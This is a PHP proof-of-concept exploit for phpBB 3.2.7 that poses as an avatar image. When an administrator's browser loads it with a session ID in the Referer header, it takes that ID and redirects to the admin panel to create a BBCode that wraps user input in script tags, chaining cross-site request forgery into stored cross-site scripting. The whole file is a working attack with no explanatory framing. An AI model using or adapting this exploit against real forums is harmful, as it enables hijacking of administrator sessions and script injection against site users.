<?php

$target_url = "http://localhost/phpBB3-3.2.7/";

// put the desired shortcode here. {TEXT} is dynamic and allows for example
// [xss]customCode();[/xss] to turn into <script>customCode()</script>.
$custom_shortcode = "[xss]{TEXT}[/xss]";

// the HTML replacement. You can also hardcore the code between the script tags.
$shortcode_replacement = "<script>{TEXT}</script>";


// If a session ID is available, attempt the CSRF exploit
if(strpos($_SERVER['HTTP_REFERER'], 'sid') !== false) {

    // leak the session ID of the nonce
    $parts = parse_url($_SERVER['HTTP_REFERER']);
    parse_str($parts['query'], $query);

    if(!isset($query['sid'])) {
        header('Content-Type: image/png');
        $img = imagecreatefrompng('avatar.png');
        imagepng($img);
        die;
    }


// build the CSRF payload
    $payload = http_build_query(
        array(
            'bbcode_match' => $custom_shortcode,
            'bbcode_tpl' => $shortcode_replacement,
            'i' => 'acp_bbcodes',
            'mode' => 'bbcodes',
            'action' => 'create',
            'sid' => $query['sid']
        )
    );

    // adm is the default admin URL
    $exploit_url = $target_url . "/adm/?" . $payload;

    header('Location: ' . $exploit_url);
} else {
    header('Content-Type: image/png');
    $img = imagecreatefrompng('avatar.png');
    imagepng($img);
    die;
}
